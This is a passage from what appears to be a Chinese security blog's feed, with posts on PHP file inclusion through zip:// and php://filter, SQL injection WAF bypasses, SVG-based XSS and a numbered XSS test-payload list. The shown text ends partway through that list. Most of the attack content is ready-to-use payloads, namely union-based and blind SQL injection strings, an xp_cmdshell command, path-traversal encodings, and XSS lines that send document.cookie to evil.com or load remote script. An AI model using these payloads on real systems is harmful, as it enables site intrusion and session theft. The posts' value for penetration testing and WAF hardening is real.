–zip://</h4><p>php版本大于等于php5.3.0</p><p>构造zip包的方法同phar</p><p>但是使用zip协议，需要指定<strong>绝对路径</strong>，同时将#编码为%23，之后填上压缩包内的文件。</p><pre><code>http://127.0.0.1/123.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txthttp://127.0.0.1/123.php?file=zip://phpinfo.zip%23phpinfo.txthttp://127.0.0.1/123.php?file=zip://./phpinfo.zip%23phpinfo.txt</code></pre><p><img src="https://i.imgur.com/zfzbat0.png" alt=""></p><p><strong>压缩流：</strong>在<code>allow_url_fopen</code> 和<code>allow_url_include</code>任何状态下都可以用。</p><p>使用方法：</p><pre><code>http://127.0.0.1/test/1.php?f=zip://./1.zip%231.txthttp://127.0.0.1/test/1.php?f=zip:///Applications/MAMP/htdos/test/1.zip%231.txthttp://127.0.0.1/test/1.php?f=file=compress.bzip2:///Applications/MAMP/htdos/test/file.jpghttp://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg</code></pre><h5 id="另一种思路："><a href="#另一种思路：" class="headerlink" title="另一种思路："></a>另一种思路：</h5><p>将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩，压缩文件 名为file.zip，如果可以上传zip文件便直接上传，如果不能则将file.zip重命名为file.jpg后上传，其他几种压缩格式也可以这样操作。</p><h4 id="PHP-input"><a href="#PHP-input" class="headerlink" title="PHP://input"></a>PHP://input</h4><p><code>allow_url_include = On。</code></p><p>对<code>allow_url_fopen</code>不做要求。</p><p><img src="https://i.imgur.com/LWAR7Gk.png" alt=""></p><p>可以访问请求的原始数据，简单来说POST请求下，php://input可以获取到post数据，如果<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p><h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>对<code>allow_url_include</code> 和<code>allow_url_fopen</code>不做要求。</p><p>在任意文件读取或者getshell会用到这个伪协议。</p><pre><code>http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php</code></pre><p><img src="https://i.imgur.com/5uTt3Qz.png" alt=""></p><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p><img src="https://i.imgur.com/6I762D1.png" alt=""></p><pre><code>http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php</code></pre><p>效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。</p><p><img src="https://i.imgur.com/TO2gT9d.png" alt=""></p><p>php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。</p><p>在include函数使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p><p><strong>php://filter 目标使用以下的参数作为它路径的一部分:</strong></p><ul><li>resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。 </li><li>read=&lt;读链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li><li>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li></ul><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。</p><pre><code>http://127.0.0.1/123.php?file=../phpinfo.txt</code></pre><p><img src="https://i.imgur.com/DFzB7L3.png" alt=""></p><blockquote><p>实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt</p></blockquote><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>服务器端常常会对于 <strong>../</strong> 等做一些过滤，可以用一些编码来进行绕过。</p><p><strong>利用url编码</strong></p><p><strong>../：</strong></p><ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e/</li></ul><p><strong>..\：</strong></p><ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul><p><strong>二次编码</strong></p><p><strong>../：</strong></p><ul><li>%252e%252e%252f</li></ul><p><strong>..\：</strong></p><ul><li>%252e%252e%255c</li></ul><p><strong>容器/服务器的编码方式</strong></p><p><strong>../：</strong></p><ul><li>..%c0%af</li><li>%c0%ae%c0%ae/（java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点））</li></ul><p><strong>..\：</strong></p><ul><li>..%c1%9c</li></ul><h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p>测试代码：</p><pre><code>&lt;?php    $file = $_GET[&apos;file&apos;];    include $file.&apos;/test/test.php&apos;;?&gt;</code></pre><p>构造压缩包结构如下：</p><p><img src="https://i.imgur.com/Tpznihz.png" alt=""></p><pre><code>http://127.0.0.1/1.php?file=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23testhttp://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip</code></pre><p><img src="https://i.imgur.com/fwBEvdb.png" alt=""></p><blockquote><p>利用zip协议，注意要指定绝对路径</p></blockquote><p><strong>则拼接后为：zip://C:\phpStudy\PHPTutorial\WWW\test%23test/test/test.php</strong></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>$$导致的变量覆盖，举个例子</p><p>$key = ‘hello’</p><p>$hello = ‘world’</p><p>echo $$key</p><p>输出world</p><h2 id="文件包含修复方案"><a href="#文件包含修复方案" class="headerlink" title="文件包含修复方案"></a>文件包含修复方案</h2><ul><li>禁止远程文件包含： <code>allow_url_include=off</code></li><li>配置 <code>open_basedir=</code>指定目录，限制访问区域。</li><li>过滤<strong>../</strong>等特殊符号</li><li>修改Apache日志文件的存放地址</li><li>开启魔术引号 <code>magic_quotes_qpc=on</code></li><li>尽量不要使用动态变量调用文件，直接写要包含的文件</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;常见的导致文件包含（文件读取）的函数如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PHP：&lt;/strong&gt;&lt;/p&gt;
&lt;p
      
    
    </summary>
    
      <category term="文件包含" scheme="http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL的WAF绕过</title>
    <link href="http://yoursite.com/2018/12/02/SQL%E7%9A%84WAF%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2018/12/02/SQL的WAF绕过/</id>
    <published>2018-12-02T07:16:47.000Z</published>
    <updated>2018-12-02T09:07:33.918Z</updated>
    
    <content type="html"><![CDATA[<p>WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。</p><h2 id="WAF的功能"><a href="#WAF的功能" class="headerlink" title="WAF的功能"></a>WAF的功能</h2><ul><li>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</li><li>访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</li><li>架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</li><li>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</li></ul><h2 id="WAF常见特点"><a href="#WAF常见特点" class="headerlink" title="WAF常见特点"></a>WAF常见特点</h2><ul><li>异常检测协议：拒绝不符合HTTP标准的请求</li><li>增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</li><li>白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题</li><li>基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</li><li>状态管理：重点进行会话保护</li><li>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</li></ul><h2 id="WAF识别扫描器"><a href="#WAF识别扫描器" class="headerlink" title="WAF识别扫描器"></a>WAF识别扫描器</h2><ul><li>1) 扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识</li><li>2)  单IP+ cookie某时间段内触发规则次数</li><li>3)  隐藏的链接标签等(<code>&lt;a&gt;</code>)</li><li>4） Cookie植入</li><li>5)  验证码验证，扫描器无法自动填充验证码</li><li>6)  单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏</li></ul><h2 id="WAF绕过思路"><a href="#WAF绕过思路" class="headerlink" title="WAF绕过思路"></a>WAF绕过思路</h2><p>根据WAF部署位置，针对WAF、WEB服务器、WEB应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法解析的差异，绕过WAF，将payload送至服务器执行。</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union，那就使用Union、UnIoN等等绕过。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union，那么我们就用<strong>%55</strong>也就是<strong>U</strong>的<strong>16进制</strong>编码来代替U，union写成 <strong>%55nION</strong>，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。</p><blockquote><p>也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。</p></blockquote><p>####（1）URL编码：</p><p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为<strong>%20</strong>、单引号<strong>%27</strong>、左括号<strong>%28</strong>、右括号<strong>%29</strong>，/为<strong>%25</strong>。</p><p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：</p><pre><code>?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT</code></pre><p>####（2）十六进制编码：</p><pre><code>/index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></pre><blockquote><p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p></blockquote><p>####（3）Unicode编码：</p><p>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p><p>常用的几个符号的一些Unicode编码：</p><ul><li>单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</li><li>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</li><li>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</li><li>右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9</li></ul><pre><code>?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1</code></pre><blockquote><p>一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用</p></blockquote><blockquote><p>二：示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p></blockquote><blockquote><p>三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过</p></blockquote><h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。</p><pre><code>index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</code></pre><blockquote><p>建议不要对此抱有太大希望….</p></blockquote><h3 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h3><p>常见的注释符：</p><pre><code>//-- /**/# --+--  -;--a</code></pre><h4 id="（1）普通注释"><a href="#（1）普通注释" class="headerlink" title="（1）普通注释"></a>（1）普通注释</h4><pre><code>index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users#</code></pre><blockquote><p><code>/**/</code>在构造得查询语句中插入注释，规避对<strong>空格</strong>的依赖或关键字识别;  #、–+用于终结语句的查询</p></blockquote><h4 id="（2）内联注释"><a href="#（2）内联注释" class="headerlink" title="（2）内联注释"></a>（2）内联注释</h4><p>相比普通注释，内联注释用的更多，它有一个特性<code>/*! */</code>只有<strong>MySQL</strong>能识别(<code>/*! */</code>表示注释里面的语句会被执行)</p><pre><code>实例一：?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3实例二：?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</code></pre><blockquote><p>两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点当然前提是包括<code>/</code>、<code>*</code>在内的这些字符能正常使用</p></blockquote><h3 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h3><p>有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p><p>####（1）函数或变量</p><ul><li>hex()、bin() ==&gt; ascii()</li><li>sleep() ==&gt;benchmark()</li><li>concat_ws()==&gt;group_concat()</li><li>mid()、substr() ==&gt; substring()</li><li>@@user ==&gt; user()</li><li>@@datadir ==&gt; datadir()</li></ul><p>比如substr()被过滤了可以用mid()和left()、right()等函数。</p><pre><code>substr((select &apos;password&apos;),1,1) = 0x70strcmp(left(&apos;password&apos;,1), 0x69) = 1strcmp(left(&apos;password&apos;,1), 0x70) = 0strcmp(left(&apos;password&apos;,1), 0x71) = -1</code></pre><p>####（2）符号</p><p><code>and</code>和<code>or</code>有可能不能使用，或者可以试下<code>&amp;&amp;</code>和<code>||</code>能不能用；还有<code>=</code>不能使用的情况，可以考虑尝试<code>&lt;</code>、<code>&gt;</code>，因为如果不小于又不大于，那边是等于了。<br>在看一下用得多的空格，可以使用如下符号表示其作用：<code>%20</code>、<code>%09</code>、<code>%0a</code>、<code>%0b</code>、<code>%0c</code>、<code>%0d</code>、<code>/**/</code></p><p>####（3）生僻函数</p><p><strong>MySQL/PostgreSQL</strong>支持<strong>XML</strong>函数：</p><pre><code>Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’);?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))　　SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));　//postgresql?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</code></pre><blockquote><p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。　</p></blockquote><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>乌云drops上“waf的绕过技巧”一文使用的几个例子：</p><ol><li>使用反引号<strong>`</strong>，例如<strong>select `version()`</strong>，可以用来绕过<strong>空格</strong>和<strong>正则</strong>，特殊情况下还可以将其做<strong>注释符</strong>用</li><li>神奇的<code>-+.</code>，<code>select+id-1+1.from users;</code>   <code>+</code>是用于字符串连接的，<code>-</code>和<code>.</code>在此也用于连接，可以逃过<strong>空格</strong>和<strong>关键字</strong>过滤</li><li><code>@</code>符号，<code>select@^1.from users; `</code>@<code>用于变量定义如</code>@var_name<code>，一个</code>@<code>表示用户定义，</code>@@`表示系统变量</li><li><code>select-count(id)test from users;</code>  //绕过空格限制</li></ol><p>部分可能发挥大作用的字符(前文中没怎么说到的):</p><pre><code>`~!@%()[].-+|%00</code></pre><p>关键字拆分：</p><pre><code>‘se’+’lec’+’t’%S%E%L%E%C%T 1?id=1;EXEC(‘ma’+&apos;ster..x’+&apos;p_cm’+&apos;dsh’+&apos;ell ”net user”’)</code></pre><p>!和()：</p><pre><code>&apos; or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT)</code></pre><blockquote><p>使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p></blockquote><h3 id="HTTP参数控制"><a href="#HTTP参数控制" class="headerlink" title="HTTP参数控制"></a>HTTP参数控制</h3><p>这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><h4 id="HPP-HTTP-Parameter-Polution-（重复参数污染）"><a href="#HPP-HTTP-Parameter-Polution-（重复参数污染）" class="headerlink" title="HPP(HTTP Parameter Polution)（重复参数污染）"></a>HPP(HTTP Parameter Polution)（重复参数污染）</h4><pre><code>/?id=1;select+1,2,3+from+users+where+id=1—/?id=1;select+1&amp;id=2,3+from+users+where+id=1—/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</code></pre><blockquote><p>HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式。</p></blockquote><blockquote><p>具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过</p></blockquote><h4 id="HPF-HTTP-Parameter-Fragment-（HTTP分割注入）"><a href="#HPF-HTTP-Parameter-Fragment-（HTTP分割注入）" class="headerlink" title="HPF(HTTP Parameter Fragment)（HTTP分割注入）"></a>HPF(HTTP Parameter Fragment)（HTTP分割注入）</h4><p>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p><pre><code>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</code></pre><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过。</p><p><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</code></p><blockquote><p>示例<code>0xA*1000指0xA</code>后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p></blockquote><h3 id="一些整合绕过的例子："><a href="#一些整合绕过的例子：" class="headerlink" title="一些整合绕过的例子："></a>一些整合绕过的例子：</h3><pre><code>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*!information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--  index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</code></pre><blockquote><p>单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少</p></blockquote><h3 id="过滤掉and和or情况下的盲注"><a href="#过滤掉and和or情况下的盲注" class="headerlink" title="过滤掉and和or情况下的盲注"></a>过滤掉and和or情况下的盲注</h3><p>假如有这样一个注入点</p><pre><code>index.php?uid=123</code></pre><p>但是and和or被过滤掉了，我们可以构造一下语句</p><pre><code>index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123</code></pre><blockquote><p>123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。</p></blockquote><h3 id="加括号"><a href="#加括号" class="headerlink" title="加括号"></a>加括号</h3><pre><code>/?id=1+union+(select+1,2+from+users)</code></pre><p>如果上面一条被WAF拦截了，可以试着加一些括号。</p><pre><code>/?id=1+union+(select+1,2+from+xxx)/?id=(1)union(select(1),mid(hash,1,32)from(users))/?id=1+union+(select&apos;1&apos;,concat(login,hash)from+users)/?id=(1)union(((((((select(1),hex(hash)from(users))))))))/?id=(1)or(0x50=0x50)</code></pre><h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、如果可能，采用基于IP的白名单；</p><p>2、对各种不能解析的内容，全部禁止访问；</p><p>3、解析的协议，要全面；</p><p>4、对各种不符合标准模式的访问，禁止；</p><p>5、WAF解析方式，与后台的WEB服务器、web应用、数据库的解析方式尽可能一致；</p><p>6、关键字的匹配，需要考虑诸多变形情况。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。&lt;/p&gt;
&lt;h2 id=&quot;WAF的功能&quot;&gt;&lt;a href=&quot;#WAF的功能&quot; class=&quot;headerlink&quot; title=&quot;WAF的功能&quot;&gt;&lt;/a&gt;WAF的功能&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;审计设备：用来截获
      
    
    </summary>
    
      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
    
    
  </entry>
  
  <entry>
    <title>SVG XSS黑魔法</title>
    <link href="http://yoursite.com/2018/12/02/SVG-XSS%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <id>http://yoursite.com/2018/12/02/SVG-XSS黑魔法/</id>
    <published>2018-12-02T06:52:12.000Z</published>
    <updated>2018-12-02T10:51:08.786Z</updated>
    
    <content type="html"><![CDATA[<p>先来看两个代码，一个可执行一个不可执行。</p><p>可执行：</p><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><p>不可执行：</p><pre><code>&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><p>那么为啥加了<code>&lt;svg&gt;</code>的可以执行？</p><p>这就得由html解析流程说起了。</p><p>html解析到<code>&lt;svg&gt;</code>的时候会变成标签开始状态(Tag open state)，然后到标签名状态(Tag name state)，等等，最终到数据状态(Data state)，并释放当前标签的token，当解析器处于数据状态(Data state)时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p><p>svg属于外部元素。</p><p>外部元素来源于<strong>MathML</strong>和<strong>SVG</strong>命名空间。</p><p>而MathML（数学标记语言）是一种基于XML的标准。</p><p>那么可以猜测<code>&lt;svg&gt;</code>遵循XML和SVG的定义。</p><p>在XML中，<code>&amp;#40;</code>会被解析成<code>(</code></p><blockquote><p>在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体</p></blockquote><pre><code>&lt;xml&gt;    &lt;name&gt;aaa&lt;/name&gt;    &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt;&lt;/xml&gt;</code></pre><p><img src="https://i.imgur.com/zbuGz8s.png" alt=""></p><p>当然，SVG标准中也定义了<code>script</code>标签的存在。</p><p>所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先来看两个代码，一个可执行一个不可执行。&lt;/p&gt;
&lt;p&gt;可执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert&amp;amp;#40;1)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不可执行：&lt;/p&gt;
&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS测试用例</title>
    <link href="http://yoursite.com/2018/12/01/XSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/"/>
    <id>http://yoursite.com/2018/12/01/XSS测试用例/</id>
    <published>2018-12-01T13:59:49.000Z</published>
    <updated>2018-12-02T07:15:35.373Z</updated>
    
    <content type="html"><![CDATA[<p>1.<code>&lt;script&gt; alert(1);&lt;/script&gt;</code></p><p>2.<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><p>3.<code>&lt;script  src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt;</code></p><p>4.<code>&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt;</code></p><p>5.<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;</code></p><p>6.<code>&lt;img src=liu.jpg onerror=alert(/xss/)/&gt;</code></p><p>7.<code>&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt;</code></p><p>8.<code>&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt;</code></p><p>9.<code>&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt;</code></p><p>10.<code>&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt;</code></p><p>11.<code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p><p>12.<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>13.<code>&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt;</code></p><p>14.<code>&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>15.<code>&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt;</code></p><p>16.<code>&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>17.<code>&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>18.<code>&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt;</code></p><p>19.<code>&#39;);alert(&#39;XSS</code></p><p>20.<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code></p><p>21.<code>[url=javascript:alert(&#39;XSS&#39;);]click me[/url]</code></p><p>22.<code>&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>23.<code>&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot;</code></p><p>24.<code>[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color]</code></p><p>25.<code>&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;</code></p><p>26.<code>window.alert(&quot;XSS&quot;);</code></p><p>27.<code>&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt;</code></p><p>28.<code>&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt;</code></p><p>29.<code>&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code><br>30.<code>&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt;</code></p><p>31.<code>&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>32.<code>&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;</code></p><p>33.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>34.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>35.<code>&lt;script&gt;var var=1; alert(var)&lt;/script&gt;</code></p><p>36.<code>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt;</code></p><p>37.<code>&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt;</code></p><p>38.<code>&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>39.<code>&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot;</code></p><p>40.<code>&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt;</code></p><p>41.<code>&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></p><p>42.<code>&lt;br 